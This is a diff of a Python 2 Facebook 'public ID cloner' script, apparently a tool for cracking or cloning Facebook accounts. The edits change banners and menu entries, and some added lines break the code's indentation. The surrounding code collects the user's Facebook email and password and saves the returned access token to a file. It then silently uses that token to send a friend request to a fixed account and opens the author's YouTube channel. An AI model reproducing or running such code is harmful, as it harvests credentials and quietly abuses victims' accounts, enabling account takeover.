@@ -50,7 +50,7 @@ def jalan(z):
 def tokenz():
 	os.system('clear')
 	print logo
-	toket = raw_input("\033[1;91m[+]\033[1;93m Token : \033[1;92m")
+	toket = raw_input("\033[1;91m[+]\033[1;93m[Token : \033[1;92m")
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -123,14 +123,12 @@ logo = """
 \033[1;92m█ ✯FACEBOKK : Niki.Cyber404                █  
 \033[1;92m█ ✯WHATSAPP : +8801927294533               █   
 \033[1;92m█ ✯GITHUB   : Niki404-Cyber                █  
-\033[1;92m╚══0═══0═════00o═══════════════════════════╝
-\033[1;92m   
+\033[1;92m╚═════════════════════════════════════════╝
 \033[1;92m╔══o00════════00o═════════════════════════╗
 \033[1;91m            PUBLIC ID CLONER
 \033[1;92m╚═════════════════════════════════════════╝
 \033[1;91m•───────────────────────────────────────────•
 """
-
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -158,8 +156,7 @@ print  """
 \033[1;92m█ ✯FACEBOKK : Niki.Cyber404                █  
 \033[1;92m█ ✯WHATSAPP : +8801927294533               █   
 \033[1;92m█ ✯GITHUB   : Niki404-Cyber                █  
-\033[1;92m╚══0═══0═════00o═══════════════════════════╝
-\033[1;92m   
+\033[1;92m╚═════════════════════════════════════════╝
 \033[1;92m╔══o00════════00o═════════════════════════╗
 \033[1;91m            PUBLIC ID CLONER
 \033[1;92m╚═════════════════════════════════════════╝
@@ -201,7 +198,9 @@ def login():
         time.sleep(0.05)
         print "\033[1;91m[4]\033[1;92mSubscribe Mr NIKI"
         time.sleep(0.05)
-	print "\033[1;91m[5]\033[1;92mFollow Niki FB Page"
+	    print "\033[1;91m[5]\033[1;92mFollow Niki FB Page"
+        time.sleep(0.05)
+        print "\033[1;91m[5]\033[1;92mFollow Niki FB ID"
         time.sleep(0.05)
         print "\033[1;91m[0]\033[1;92mExit"
 	time.sleep(0.05)
@@ -224,6 +223,8 @@ def pilih_login():
 	        login()
         elif peak =="5":
 	        os.system('xdg-open https://www.facebook.com/NIKI.CYBER404.OFFICIALS')
+        elif peak =="6":
+	        os.system('xdg-open https://www.facebook.com/100001962715207')
                 login()
 	elif peak =="0":
 		keluar()
@@ -241,7 +242,7 @@ def login1():
                 time.sleep(0.05)
 		print logo                
 		print "\033[1;92m•-----------------\033[1;92mMr-NIKI\033[1;92m-----------------•"
-		print('\033[1;91m[+]\033[1;47m\033[1;92mLOGIN WITH FACEBOOK\x1b[1;92m \033[1;0m' )
+		print('\033[1;91m[+]\033[1;92mLOGIN WITH FACEBOOK\x1b[1;92m \033[1;0m' )
 		print('	' )
 		id = raw_input('\033[1;91m[!] \x1b[1;92mNumber/Email\x1b[1;93m: \x1b[1;92m')
 		pwd = raw_input('\033[1;91m[+] \x1b[1;92mPassword\x1b[1;93m    : \x1b[1;92m')
@@ -271,7 +272,7 @@ def login1():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\033[1;47m\033[1;92m Login Successful\033[1;0m'
+				print '\033[1;92m Login Successful\033[1;0m'
 				os.system('xdg-open https://youtube.com/channel/UCsH0yB-x6fKeu8uQ-uDhTzw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
